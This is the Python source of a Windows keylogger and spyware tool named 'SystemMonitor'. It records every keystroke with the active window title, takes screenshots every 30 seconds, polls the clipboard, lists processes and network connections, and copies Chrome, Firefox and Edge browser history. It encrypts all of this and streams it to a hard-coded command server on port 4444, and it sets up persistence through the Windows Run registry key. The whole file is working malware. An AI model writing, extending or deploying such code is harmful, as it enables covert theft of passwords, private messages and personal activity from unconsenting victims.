

import os
import getpass
import pyperclip
import psutil
import platform
import socket
import requests
import time
import threading
import json
import base64
import sys
import shutil
from datetime import datetime, timedelta
from pynput import keyboard
from mss import mss
from cryptography.fernet import Fernet

# Windows specific imports
import win32gui
import win32process
import winreg

# --- Configuration ---
CONFIG_URL = 'http://192.168.100.9:8000/config.txt'  # URL to fetch server IP from
SERVER_HOST = '192.168.100.9'  # Fallback server IP
SERVER_PORT = 4444
# Optional: Restrict logging to specific applications
# TARGET_APPS = ["chrome.exe", "firefox.exe", "notepad.exe"] 
TARGET_APPS = [] # Empty list means log all apps

# --- Persistence ---
APP_NAME = "SystemMonitor"
APP_DIR = os.path.join(os.getenv("APPDATA"), APP_NAME)
APP_PATH = os.path.join(APP_DIR, f"{APP_NAME}.exe")

def get_server_host():
    try:
        response = requests.get(CONFIG_URL)
        if response.status_code == 200:
            return response.text.strip()
    except Exception as e:
        pass
    return SERVER_HOST

SERVER_HOST = get_server_host()

# --- Encryption ---
key = None
fernet = None

client_socket = None
fernet = None

def connect_to_server():
    global client_socket, fernet
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            key = client_socket.recv(1024)
            fernet = Fernet(key)
            break
        except Exception as e:
            time.sleep(5)

connect_to_server()

def send_data(data):
    global fernet, client_socket
    while True:
        try:
            if not fernet or not client_socket:
                connect_to_server()
            
            encrypted_data = fernet.encrypt(json.dumps(data).encode('utf-8'))
            client_socket.sendall(encrypted_data + b'\n')
            # print(f"[+] Sent data of type: {data.get('type')}") # for debugging
            break # Data sent successfully
        except (ConnectionResetError, BrokenPipeError, OSError) as e:
            # print(f"[!] Connection error in send_data: {e}. Reconnecting...")
            connect_to_server()
        except Exception as e:
            # print(f"[!] An unexpected error occurred in send_data: {e}")
            time.sleep(5)

# --- Data Collection ---

def get_system_info():
    try:
        return {
            'type': 'system_info',
            'timestamp': datetime.now().strftime("%Y%m%d_%H%M%S"),
            'platform': platform.system(),
            'platform_release': platform.release(),
            'platform_version': platform.version(),
            'architecture': platform.machine(),
            'hostname': socket.gethostname(),
            'ip_address': socket.gethostbyname(socket.gethostname()),
            'mac_address': ':'.join(f'{i:02x}' for i in psutil.net_if_addrs()['Ethernet'][0].address.split('-')),
            'username': getpass.getuser(),
            'cpu_usage': psutil.cpu_percent(),
            'ram_usage': psutil.virtual_memory().percent,
        }
    except Exception as e:
        return {'type': 'error', 'message': f'Error getting system info: {e}'}

def log_clipboard():
    while True:
        try:
            clipboard_content = pyperclip.paste()
            if clipboard_content:
                send_data({
                    'type': 'clipboard',
                    'timestamp': datetime.now().strftime("%Y%m%d_%H%M%S"),
                    'content': clipboard_content,
                })
        except Exception as e:
            pass
        time.sleep(10) # Check every 10 seconds

def log_processes():
    while True:
        try:
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'username']):
                processes.append(proc.info)
            send_data({
                'type': 'processes',
                'timestamp': datetime.now().strftime("%Y%m%d_%H%M%S"),
                'processes': processes,
            })
        except Exception as e:
            pass
        time.sleep(60) # Log every 60 seconds

def log_network_activity():
    while True:
        try:
            connections = []
            for conn in psutil.net_connections(kind='inet'):
                if conn.status == 'ESTABLISHED':
                    try:
                        p = psutil.Process(conn.pid)
                        connections.append({
                            'pid': conn.pid,
                            'process_name': p.name(),
                            'local_address': f"{conn.laddr.ip}:{conn.laddr.port}",
                            'remote_address': f"{conn.raddr.ip}:{conn.raddr.port}",
                            'status': conn.status,
                        })
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue
            if connections:
                send_data({
                    'type': 'network_activity',
                    'timestamp': datetime.now().strftime("%Y%m%d_%H%M%S"),
                    'connections': connections,
                })
        except Exception as e:
            pass
        time.sleep(60) # Log every 60 seconds

import sqlite3

def log_browser_history():
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "History"),
        "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "History"),
    }

    while True:
        history_data = []
        for browser_name, history_path in browsers.items():
            try:
                if browser_name == "Firefox":
                    # Find Firefox profile directory
                    for root, dirs, files in os.walk(history_path):
                        for file in files:
                            if file == "places.sqlite":
                                history_path = os.path.join(root, file)
                                break
                        if history_path.endswith("places.sqlite"):
                            break
                    else:
                        continue # No Firefox history found

                temp_history_path = os.path.join(os.getenv("TEMP"), f"{browser_name}_History.sqlite")
                shutil.copyfile(history_path, temp_history_path)

                conn = sqlite3.connect(temp_history_path)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
                
                for row in cursor.fetchall():
                    history_data.append({
                        "browser": browser_name,
                        "url": row[0],
                        "title": row[1],
                        "timestamp": datetime(1601, 1, 1) + timedelta(microseconds=row[2]) # Convert Chrome/Edge timestamp
                    })
                conn.close()
                os.remove(temp_history_path)
            except Exception as e:
                pass
        
        if history_data:
            send_data({
                'type': 'browser_history',
                'timestamp': datetime.now().strftime("%Y%m%d_%H%M%S"),
                'history': history_data,
            })
        time.sleep(3600) # Log every hour



def get_active_window_info():
    try:
        hwnd = win32gui.GetForegroundWindow()
        pid = win32process.GetWindowThreadProcessId(hwnd)[1]
        proc = psutil.Process(pid)
        exe_name = proc.name()
        window_title = win32gui.GetWindowText(hwnd)
        return window_title, exe_name
    except (psutil.NoSuchProcess, psutil.AccessDenied):
        return "UNKNOWN", "UNKNOWN"
    except Exception as e:
        return "UNKNOWN", "UNKNOWN"

def log_keystroke(key):
    window_title, exe_name = get_active_window_info()

    if TARGET_APPS and exe_name not in TARGET_APPS:
        return # Skip logging if the app is not in the target list

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    key_str = format_key(key)

    data = {
        'type': 'keystroke',
        'timestamp': timestamp,
        'key': key_str,
        'window_title': window_title,
        'application': exe_name,
    }
    send_data(data)

def capture_screenshot():
    while True:
        try:
            with mss() as sct:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                sct_img = sct.grab(sct.monitors[0])
                img_bytes = mss.tools.to_png(sct_img.rgb, sct_img.size)
                img_base64 = base64.b64encode(img_bytes).decode('utf-8')

                data = {
                    'type': 'screenshot',
                    'timestamp': timestamp,
                    'image': img_base64,
                }
                send_data(data)
        except Exception as e:
            pass
        
        time.sleep(30) # Capture every 30 seconds

def format_key(key):
    if hasattr(key, 'char') and key.char:
        return key.char
    else:
        return str(key)

def install():
    try:
        os.makedirs(APP_DIR, exist_ok=True)
        shutil.copy(sys.executable, APP_PATH)
        
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, APP_NAME, 0, winreg.REG_SZ, APP_PATH)
        print(f"[+] Installed to {APP_PATH}")
    except Exception as e:
        print(f"[!] Failed to install: {e}")

def uninstall():
    try:
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.DeleteValue(reg_key, APP_NAME)
        
        os.remove(APP_PATH)
        os.rmdir(APP_DIR)
        print(f"[+] Uninstalled from {APP_PATH}")
    except FileNotFoundError:
        print("[!] Not installed.")
    except Exception as e:
        print(f"[!] Failed to uninstall: {e}")

# --- Main ---
if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == 'install':
            install()
            sys.exit(0)
        elif sys.argv[1] == 'uninstall':
            uninstall()
            sys.exit(0)

    # Run the keylogger if it's installed
    # if os.path.abspath(sys.executable) != os.path.abspath(APP_PATH):
    #     sys.exit(0)

    send_data(get_system_info())

    # Start background threads
    threading.Thread(target=capture_screenshot, daemon=True).start()
    threading.Thread(target=log_clipboard, daemon=True).start()
    threading.Thread(target=log_processes, daemon=True).start()
    threading.Thread(target=log_network_activity, daemon=True).start()
    threading.Thread(target=log_browser_history, daemon=True).start()

    with keyboard.Listener(on_press=log_keystroke) as listener:
        listener.join()
